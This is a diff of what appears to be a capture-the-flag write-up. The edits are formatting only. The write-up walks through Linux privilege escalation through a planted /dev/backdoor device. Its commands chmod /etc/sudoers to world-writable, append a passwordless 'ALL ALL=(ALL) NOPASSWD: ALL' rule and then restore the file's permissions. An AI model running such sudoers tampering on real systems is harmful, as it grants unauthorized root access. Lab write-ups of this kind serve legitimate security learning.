@@ -107,7 +107,7 @@ Now we try to write to it... But we can't?
 Oh, the perms are all messed up, that's totally not 777.
 
 ```sh
-$ls -l /etc/sudoers
+$ ls -l /etc/sudoers
 ------x--x
 ```
 
@@ -115,10 +115,10 @@ Hmmm, lets investigate this further.
 Lets make a random file at `/tmp/t` and see if I can understand the perms.
 
 ```sh
-echo "b4ckd00r:/tmp/t:2" > /dev/backdoor
-> --------w-
-echo "b4ckd00r:/tmp/t:3" > /dev/backdoor
-> --------wx
+$ echo "b4ckd00r:/tmp/t:2" > /dev/backdoor
+# resulted in --------w-
+$ echo "b4ckd00r:/tmp/t:3" > /dev/backdoor
+# resulted in --------wx
 ```
 
 Oh, I know this pattern, its just binary. That's probably the default behavior, I just did not know about it.
@@ -126,20 +126,20 @@ Oh, I know this pattern, its just binary. That's probably the default behavior, 
 `1111111111` binary to decimal is `1023`, lets try that.
 
 ```sh
-echo "b4ckd00r:/tmp/t:1023" > /dev/backdoor
-.rwxrwxrwx
+$ echo "b4ckd00r:/tmp/t:1023" > /dev/backdoor
+# .rwxrwxrwx
 ```
 
 That looks good! Lets use it on the real one.
 
 ```sh
-echo "b4ckd00r:/etc/sudoers:1023" > /dev/backdoor
+$ echo "b4ckd00r:/etc/sudoers:1023" > /dev/backdoor
 ```
 
 Now with the chmoded file we need to add something to let us use sudo... What about all commands without any password? Seems safe.
 
 ```sh
-echo "ALL ALL=(ALL) NOPASSWD: ALL">>/etc/sudoers
+$ echo "ALL ALL=(ALL) NOPASSWD: ALL">>/etc/sudoers
 ```
 
 It didn't error out!
@@ -148,7 +148,7 @@ Sudo requires the permissions on `/etc/sudoers` to not be writable by everyone, 
 It also requires us to be on the user list, which we are not, we just have `uid 1000`, but no user.
 
 ```sh
-echo "b4ckd00r:/etc/sudoers:448" > /dev/backdoor
+$ echo "b4ckd00r:/etc/sudoers:448" > /dev/backdoor
 ```
 
 Sudo perms fixed, onto adding a user, with `uid 1000` and a random name.
